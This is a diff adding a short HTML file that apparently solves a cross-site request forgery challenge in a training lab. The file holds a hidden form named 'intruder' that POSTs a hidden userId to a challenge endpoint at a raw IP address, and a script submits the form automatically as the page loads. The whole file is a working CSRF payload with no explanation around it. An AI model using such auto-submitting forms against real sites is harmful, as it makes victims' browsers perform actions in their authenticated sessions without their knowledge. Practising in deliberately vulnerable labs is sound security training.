@@ -1,0 +1,7 @@
+<form name="intruder"
+action="https://76.186.10.201/user/csrfchallengetwo/plusplus" method="POST">
+<input type="hidden" name="userId"
+value="b1b1b1abdbdbc53115a6368f890470000c30b0e5"/>
+<input type="submit"/>
+</form>
+<script> document.intruder.submit();</script>
